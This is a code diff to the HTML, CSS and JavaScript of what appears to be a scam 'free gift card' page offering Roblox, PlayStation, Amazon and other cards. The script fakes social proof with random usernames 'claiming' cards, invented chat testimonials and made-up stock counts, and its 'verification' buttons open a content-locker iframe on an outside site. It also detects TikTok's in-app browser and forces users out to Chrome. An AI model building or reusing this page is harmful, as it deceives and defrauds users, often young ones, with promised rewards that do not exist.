@@ -40,29 +40,35 @@ z-index:-3;
 100%{transform:scale(1.12) translateY(-18px);}
 }
 
-/* --- NEW: TOP NOTIFICATION --- */
+/* --- RE-DESIGNED NOTIFICATION (L-STYLE LI BGHTI) --- */
 #notification-toast {
     position: fixed;
-    top: 20px;
-    left: 50%;
-    transform: translate(-50%, -200%);
-    background: rgba(15, 15, 15, 0.95);
+    bottom: 20px; /* Rej3at lteht f jneb bhal style sbaq */
+    left: 20px;
+    background: rgba(10, 10, 10, 0.98);
     border: 1px solid rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(12px);
-    padding: 10px 20px;
-    border-radius: 50px;
+    backdrop-filter: blur(15px);
+    padding: 14px;
+    border-radius: 20px;
     display: flex;
     align-items: center;
-    gap: 12px;
-    z-index: 10001;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+    gap: 15px;
+    z-index: 10000;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+    transform: translateX(-160%);
     transition: transform 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55);
-    white-space: nowrap;
+    max-width: 320px;
 }
-#notification-toast.show { transform: translate(-50%, 0); }
-.notif-img { width: 28px; height: 28px; background: #fff; border-radius: 50%; padding: 4px; object-fit: contain; }
-.notif-user { font-weight: 800; color: #60a5fa; font-size: 13px; }
-.notif-text { font-size: 12px; opacity: 0.9; }
+#notification-toast.show { transform: translateX(0); }
+.notif-img-container {
+    width: 45px; height: 45px; background: #fff; border-radius: 12px;
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0; padding: 5px;
+}
+.notif-img-container img { width: 100%; height: 100%; object-fit: contain; }
+.notif-content { font-size: 13px; line-height: 1.4; }
+.notif-user { font-weight: 800; color: #60a5fa; }
+.notif-card-name { color: #a855f7; font-weight: 700; }
+.notif-time { display: block; font-size: 10px; opacity: 0.5; margin-top: 3px; }
 
 .header{text-align:center;padding:34px 15px 20px}
 .title{
@@ -118,7 +124,7 @@ background:rgba(96,165,250,.14);
 color:#93c5fd;
 }
 
-/* --- NEW: LIVE CHAT AREA (BOTTOM) --- */
+/* --- LIVE CHAT AREA --- */
 .chat-container {
     max-width: 580px;
     margin: 40px auto 20px;
@@ -267,7 +273,7 @@ font-weight:bold;
 .grid{grid-template-columns:1fr}
 .title{font-size:28px}
 #selectedTitle{font-size:23px}
-#notification-toast { width: 85%; font-size: 11px; }
+#notification-toast { left: 10px; right: 10px; bottom: 10px; }
 }
 
 /* TikTok overlay */
@@ -276,23 +282,12 @@ position:fixed;
 inset:0;
 background:rgba(0,0,0,.96);
 display:none;
-justify-content:center;
-align-items:center;
-flex-direction:column;
-z-index:999999;
-text-align:center;
-padding:20px;
+justify-content:center; align-items:center; flex-direction:column; z-index:999999; text-align:center; padding:20px;
 }
 #ttOverlay h2{margin-bottom:10px}
 #ttOverlay p{opacity:.7;margin-bottom:20px}
 #ttOverlay button{
-padding:12px 18px;
-border:none;
-border-radius:10px;
-background:#3b82f6;
-color:#fff;
-font-weight:800;
-cursor:pointer;
+padding:12px 18px; border:none; border-radius:10px; background:#3b82f6; color:#fff; font-weight:800; cursor:pointer;
 }
 </style>
 </head>
@@ -300,17 +295,20 @@ cursor:pointer;
 <body>
 
 <div id="notification-toast">
-    <img src="" id="notif-img" class="notif-img">
+    <div class="notif-img-container">
+        <img src="" id="notif-img">
+    </div>
     <div class="notif-content">
         <span class="notif-user" id="notif-user"></span> 
-        <span class="notif-text" id="notif-text">claimed a $50 Card</span>
+        successfully claimed a 
+        <span class="notif-card-name" id="notif-card-name"></span>
+        <span class="notif-time" id="notif-time"></span>
     </div>
 </div>
 
 <div id="ttOverlay">
 <h2>Open in Browser</h2>
-<p>1- Tap the three dots at the top right
-2- Tap Open in browser</p>
+<p>1- Tap the three dots at the top right<br>2- Tap Open in browser</p>
 <button onclick="openChrome()">Open Now</button>
 </div>
 
@@ -320,49 +318,42 @@ cursor:pointer;
 </div>
 
 <div class="grid" id="grid">
-
 <div class="card" onclick="openOffer('ROBLOX 20$-50$ CARD', this)">
 <img src="https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png">
 <div class="name">ROBLOX</div>
 <div class="price">$20 - $50</div>
 <div class="tag">Still 46 Card</div>
 </div>
-
 <div class="card" onclick="openOffer('PLAYSTATION 25$-50$ CARD', this)">
 <img src="https://upload.wikimedia.org/wikipedia/commons/0/00/PlayStation_logo.svg">
 <div class="name">PLAYSTATION</div>
 <div class="price">$25 - $50</div>
 <div class="tag">Still 37 Card</div>
 </div>
-
 <div class="card" onclick="openOffer('AMAZON 20$-150$ CARD', this)">
 <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
 <div class="name">AMAZON</div>
 <div class="price">$20 - $150</div>
 <div class="tag">Still 61 Card</div>
 </div>
-
 <div class="card" onclick="openOffer('APPLE 20$-75$ CARD', this)">
 <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
 <div class="name">APPLE</div>
 <div class="price">$20 - $75</div>
 <div class="tag">Still 50 Card</div>
 </div>
-
 <div class="card" onclick="openOffer('GOOGLE PLAY 10$-100$ CARD', this)">
 <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg">
 <div class="name">GOOGLE PLAY</div>
 <div class="price">$10 - $100</div>
 <div class="tag">Still 72 Card</div>
 </div>
-
 <div class="card" onclick="openOffer('NETFLIX 30$-50$ CARD', this)">
 <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
 <div class="name">NETFLIX</div>
 <div class="price">$30 - $50</div>
 <div class="tag">Still 28 Card</div>
 </div>
-
 </div>
 
 <div class="chat-container" id="chatArea">
@@ -379,36 +370,18 @@ cursor:pointer;
 
 <div class="offerPage" id="offerPage">
 <div class="box">
-
 <img id="selectedImage" class="selectedImage">
 <div id="selectedTitle"></div>
-
-<div class="option">
-<div class="opt">Fast Verification</div>
-<button onclick="go()">Start</button>
-</div>
-
-<div class="option">
-<div class="opt">Backup Option</div>
-<button onclick="go()">Start</button>
-</div>
-
+<div class="option"><div class="opt">Fast Verification</div><button onclick="go()">Start</button></div>
+<div class="option"><div class="opt">Backup Option</div><button onclick="go()">Start</button></div>
 <button class="back" onclick="backPage()">← Back</button>
-
 </div>
 </div>
 
-<div id="lockerModal">
-<div class="lockerBox">
-<iframe id="lockerFrame"></iframe>
-<button class="closeBtn" onclick="closeLocker()">✕</button>
-</div>
-</div>
-
+<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe><button class="closeBtn" onclick="closeLocker()">✕</button></div></div>
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
-// --- CONFIG DATA ---
 const users = ["James_Vip", "Sarah.Miller", "Daniel_99", "EmilyUSA", "MikeTech", "Jessica_K", "Chris.B", "Robert_L", "Linda_W", "Kevin_S"];
 const cardsData = [
     {n: "Roblox $50", img: "https://logos-world.net/wp-content/uploads/2020/10/Roblox-Logo.png"},
@@ -419,35 +392,30 @@ const cardsData = [
 ];
 const chatMsgs = ["Just received my code!", "Verification was easy", "Legit site, thanks!", "Got the Amazon card instantly", "Second time using this, works great"];
 
-// --- 1. TOP NOTIFICATION LOGIC ---
-function showTopNotif() {
+function showNotif() {
     const toast = document.getElementById('notification-toast');
     const u = users[Math.floor(Math.random()*users.length)];
     const c = cardsData[Math.floor(Math.random()*cardsData.length)];
-    
+    const now = new Date();
+    const time = now.getHours() + ":" + (now.getMinutes()<10?'0':'') + now.getMinutes();
+
     document.getElementById('notif-user').innerText = "@" + u;
     document.getElementById('notif-img').src = c.img;
-    document.getElementById('notif-text').innerText = "just claimed a " + c.n + " Card";
+    document.getElementById('notif-card-name').innerText = c.n + " Card";
+    document.getElementById('notif-time').innerText = "Today at " + time;
     
     toast.classList.add('show');
-    setTimeout(() => { toast.classList.remove('show'); }, 4000);
-    setTimeout(showTopNotif, Math.random() * (12000 - 8000) + 8000);
+    setTimeout(() => { toast.classList.remove('show'); }, 5000);
+    setTimeout(showNotif, Math.random() * (15000 - 8000) + 8000);
 }
 
-// --- 2. LIVE CHAT LOGIC ---
 function addChat() {
     const box = document.getElementById('chatBox');
     const u = users[Math.floor(Math.random()*users.length)];
     const m = chatMsgs[Math.floor(Math.random()*chatMsgs.length)];
     const now = new Date();
     const time = now.getHours() + ":" + (now.getMinutes()<10?'0':'') + now.getMinutes();
-
-    const html = `
-        <div class="chat-msg">
-            <div class="chat-user"><span>@${u}</span><span>${time}</span></div>
-            <div class="chat-text">${m}</div>
-        </div>
-    `;
+    const html = `<div class="chat-msg"><div class="chat-user"><span>@${u}</span><span>${time}</span></div><div class="chat-text">${m}</div></div>`;
     box.innerHTML += html;
     box.scrollTop = box.scrollHeight;
     if(box.children.length > 8) box.removeChild(box.firstChild);
@@ -464,46 +432,21 @@ document.getElementById("chatArea").style.display="none";
 document.getElementById("offerPage").style.display="block";
 document.getElementById("selectedTitle").innerText=title;
 document.getElementById("selectedImage").src=img;
-window.scrollTo({top:0,behavior:"smooth"});
+window.scrollTo(0,0);
 },900);
 }
 
-function go(){
-document.getElementById("lockerModal").style.display="flex";
-document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622";
-}
-
-function closeLocker(){
-document.getElementById("lockerModal").style.display="none";
-document.getElementById("lockerFrame").src="";
-}
-
-function backPage(){
-document.getElementById("offerPage").style.display="none";
-document.getElementById("grid").style.display="grid";
-document.getElementById("chatArea").style.display="block";
-}
-
-function isTikTok(){
-return /TikTok|musical_ly/i.test(navigator.userAgent);
-}
-
-function openChrome(){
-const url = window.location.href;
-const intent = "intent://" + url.replace(/^https?:\/\//,'') +
-"#Intent;scheme=https;package=com.android.chrome;end;";
-window.location.href = intent;
-setTimeout(()=>{window.location.href=url},900);
-}
+function go(){ document.getElementById("lockerModal").style.display="flex"; document.getElementById("lockerFrame").src="https://checkmyapp.store/cl/i/pqq622"; }
+function closeLocker(){ document.getElementById("lockerModal").style.display="none"; document.getElementById("lockerFrame").src=""; }
+function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
+function isTikTok(){ return /TikTok|musical_ly/i.test(navigator.userAgent); }
+function openChrome(){ const url = window.location.href; window.location.href = "intent://" + url.replace(/^https?:\/\//,'') + "#Intent;scheme=https;package=com.android.chrome;end;"; }
 
 window.addEventListener("load",()=>{
-    showTopNotif();
+    showNotif();
     addChat();
-    if(isTikTok()){
-        document.getElementById("ttOverlay").style.display="flex";
-    }
+    if(isTikTok()) document.getElementById("ttOverlay").style.display="flex";
 });
 </script>
-
 </body>
 </html>
